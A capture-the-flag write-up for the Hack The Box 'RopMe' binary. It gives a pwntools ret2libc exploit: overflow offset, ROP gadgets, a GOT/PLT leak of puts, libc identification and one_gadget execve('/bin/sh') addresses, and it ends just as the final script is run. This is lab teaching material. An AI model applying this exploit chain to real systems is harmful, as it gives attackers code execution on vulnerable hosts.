# Overview
Running the binary just asks us to `ROP me outside, how 'about dah?` which hints at <ins>r</ins>eturn <ins>o</ins>riented <ins>p</ins>rogramming (ROP) - redirecting code execution by abusing a buffer overflow vulnerability. And indeed, when hammering the input with a lot of characters we get a seg fault:
{: .text-justify}
```
kali@kali:~$ ./ropme
ROP me outside, how 'about dah?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```
# Looking into
As always when dealing with binary exploitation we run `file` and `checksec` on the file: 
```bash
kali@kali:~/HTB/challenges/pwn/RopMe$ file ropme 
ropme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e30ea7fd405c5104fd0d97dc464c513b05005fdb, not stripped

kali@kali:~/HTB/challenges/pwn/RopMe$ checksec ropme

    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
The first thing we note is it's a dynamically linked binary, so libraries such as libc are not included in this binary but loaded at runtime at random (base) address. Since we will later want to run `/bin/sh` from libc to get a shell we not only need to leak the libc version from the box but also calculate the base address of libc at runtime in order to be able to find the address of `system("/bin/sh")` and execute it.<br> 
How is calling an external function executed? This is where the <ins>p</ins>rocedure <ins>l</ins>inkage <ins>t</ins>able (PLT) and <ins>g</ins>lobal <ins>o</ins>ffset <ins>t</ins>able (GOT) come into play:<br>
Let's say we want to call `puts`. Calling `puts` will first be translated to `puts@plt` and the program jumps to the PLT. Looking at `ghidra` we find two jump instructions there, the first will go to the GOT, the second to another function:
{: .text-justify}
```c
                  puts                           XREF[1] main:0040063a(c)  
  004004e0 ff 25     JMP    qword ptr [->puts]             int puts(char * __s)
           32 0b 
           20 00
                  -- Flow Override: CALL_RETURN (COMPUTE
  004004e6 68 00     PUSH   0x0
           00 00 
           00
  004004eb e9 e0     JMP    FUN_004004d0                   undefined FUN_004004
           ff ff 
           ff
```
The first time calling puts, the address in libc of puts has not yet been loaded (lazy initialization). Therefore we jump to the function called `FUN_004004d0` which finds the address in libc and writes it into the GOT. The second time round we can directly jump to the GOT and to libc (Thanks to [LiveOverflow](https://www.youtube.com/watch?v=kUk5pw4w0h4)). This enables us to get an address leak.<br>
We also notice, that this is not a <ins>p</ins>osition <ins>i</ins>ndependent <ins>e</ins>xecutable (PIE) which means the program will be loaded at the same location in memory every time and the addresses will thus stay the same.
Now onto the binary. Looking at the code in `ghidra`, we see `fgets` reading 500 bytes into a 64 bytes long char, causing the BOF earlier:
{: .text-justify}
```c
undefined8 main(void)

{
  char local_48 [64];
  
  puts("ROP me outside, how \'about dah?");
  fflush(stdout);
  fgets(local_48,500,stdin);
  return 0;
}
```
So we use `pwntools` and attach gdb to analyze the BOF:
```py
from pwn import *

p = process('./ropme')

p.recvline_contains("ROP me outside")

payload = b''
payload += cyclic(0x100, n=8)	# Sufficiently large byte string
pause()				# If this pause() has been reached, we run gdb -p $(pidof ropme)
p.sendline(payload)

p.interactive()
```
`cyclic(0x100, n=8)` creates a 256 bytes long cyclic string consisting of 8 byte long unique substrings. After sending the payload we find the unique substring `0x616161616161616a` inside the stack pointer (RSP) register which contains the address that will moved to the instruction pointer and executed next. With the use of pwntools `cyclic_find` we find out that this string is located after 72 bytes.
{: .text-justify}
```bash
gefâž¤  x/10wxg $rsp
0x7ffdadd33cd8: 0x616161616161616a
>>> cyclic_find(0x616161616161616a, n=8)
72
```
To make sure everything works as we now repeat the process but replace our payload to `b'A'*72 + b'B'*8`. We now find all eight Bs in the RSP. Nice.

# First lap - collecting addresses
Big shoutout to `0xdf` for his writeup on `Ellingson`. Since we have the same initial conditions as in the root part of `Ellingson` we can follow his two-step approach and basically just need to find the right addresses. First we are looking for `pop rdi` to load the first value of the stack into the rdi register and then return.
{: .text-justify}
```bash
kali@kali:~$ ropper --file ropme --search "% ?di"
`0x00000000004006d3: pop rdi; ret;`
```
Now we need to think about what we want to put on the stack that will be moved into the rdi. We need to leak a libc address so why not try leaking the puts address in libc that has been loaded into the `GOT`. Using `objdump` or searching in `ghidra` will hand us the address of `puts` in `plt` and `GOT`:
{: .text-justify}
```
kali@kali:~$ objdump -D ropme | grep puts@GLIBC
4004e0:       ff 25 32 0b 20 00       jmpq   *0x200b32(%rip)        # 601018 <puts@GLIBC_2.2.5>
```
Finally we need the address of the main function to be able to send our second payload.
```
kali@kali:~$ objdump -D ropme | grep main
0000000000400626 <main>:
```
This leads to a payload of
```py
junk     = b'A'*72
puts_plt = p64(0x4004e0)	# p64 for 64-bit and correct endianess
pop_rdi  = p64(0x4006d3)
ret_main = p64(0x400626)
puts_got = p64(0x601018)

payload = b''
payload += junk + pop_rdi + puts_got + puts_plt + ret_main

p.sendline(payload)
leaked_puts = u64(p.recvline()[:-1].ljust(8, b'\x00'))
log.success("Leaked puts address: 0x%x" % leaked_puts)
```
So after the junk, we load the address stored in the GOT into the rdi register, return to puts which will leak the address and then return back to the main function of the program.<br>
This way we get the libc address leak:
```bash
[+] Leaked puts address: 0x7f6e03c4a690
```
# Second lap - getting shell
We do not have access to the `libc` of the box but we are still able to use the [libc database](https://github.com/niklasb/libc-database) with our data leak. Just feeding in the last three digits of the leak will result in two possible libcs:
```bash
kali@kali:/opt/libc-database$ ./find puts 690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
We go with the first, download it and grab the address of `puts`
```bash
kali@kali:/opt/libc-database/libs/libc6_2.23-0ubuntu10_amd64$ readelf -s libc.so.6 | grep "puts@@GLIBC"
   186: 000000000006f690   456 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
   404: 000000000006f690   456 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
```
as well as the addresses of `execve("/bin/sh")`:
```bash
kali@kali:/opt/libc-database/libs/libc6_2.23-0ubuntu10_amd64$ one_gadget libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
With this we only need to calculate the base address of libc from the leak, add the address to the system call to `/bin/sh` to it and send it together with 72 bytes of junk to get a shell:
```bash
kali@kali:~/HTB/challenges/pwn/RopMe$ python xpl.py
